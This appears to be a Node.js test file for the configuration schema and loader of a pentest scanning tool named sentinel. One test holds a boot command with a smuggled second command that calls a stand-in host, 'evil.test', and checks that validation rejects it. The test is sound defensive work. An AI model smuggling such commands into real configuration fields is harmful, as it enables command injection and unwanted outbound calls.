import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";
import { test } from "node:test";

import { ConfigSchema, loadConfig, validateConfigForScan } from "../src/config/sentinel.config.js";

test("config schema accepts spec pentest and graph fields", () => {
  const config = ConfigSchema.parse({
    apiUrl: "http://localhost:8000",
    repoName: "repo",
    boot: "docker compose up -d",
    healthcheck: "curl -sf http://localhost:3000/health",
    egress_allowlist: ["api.example.com"],
    pentest: { memory_mb: 4096 },
    graph: { custom_adapters: ["tools/custom-adapter.js"] }
  });

  assert.equal(config.pentest.memory_mb, 4096);
  assert.deepEqual(config.egress_allowlist, ["api.example.com"]);
  validateConfigForScan(config);
});

test("scan config validation rejects shell metacharacters", () => {
  const config = ConfigSchema.parse({
    apiUrl: "http://localhost:8000",
    repoName: "repo",
    boot: "docker compose up -d && curl http://evil.test"
  });

  assert.throws(() => validateConfigForScan(config), /shell metacharacters/);
});

test("config schema accepts §3 D1 pentest reachability fields", () => {
  const config = ConfigSchema.parse({
    apiUrl: "http://localhost:8000",
    repoName: "repo",
    repo_id: "repo-123",
    pentest_mode: "staging",
    staging_base_url: "https://staging.acme.test",
    healthcheck_path: "/healthz",
    egress_allowlist: ["api.example.com"]
  });

  assert.equal(config.pentest_mode, "staging");
  assert.equal(config.staging_base_url, "https://staging.acme.test");
  assert.equal(config.healthcheck_path, "/healthz");
  assert.equal(config.repo_id, "repo-123");
});

test("config schema rejects an invalid pentest_mode", () => {
  assert.throws(() =>
    ConfigSchema.parse({ apiUrl: "http://localhost:8000", repoName: "repo", pentest_mode: "firecracker" })
  );
});

test("apiUrl defaults to the hosted backend", () => {
  const cfg = ConfigSchema.parse({ repoName: "demo" });
  assert.equal(cfg.apiUrl, "https://sentinel-steel-xi.vercel.app");
});

test("loadConfig maps spec api_endpoint to apiUrl", () => {
  const root = mkdtempSync(join(tmpdir(), "sentinel-config-"));
  mkdirSync(join(root, ".git"));
  writeFileSync(
    join(root, "sentinel.config.json"),
    JSON.stringify({
      repoName: "repo",
      api_endpoint: "https://api.sentinel.example"
    })
  );

  assert.equal(loadConfig(root).apiUrl, "https://api.sentinel.example");
});
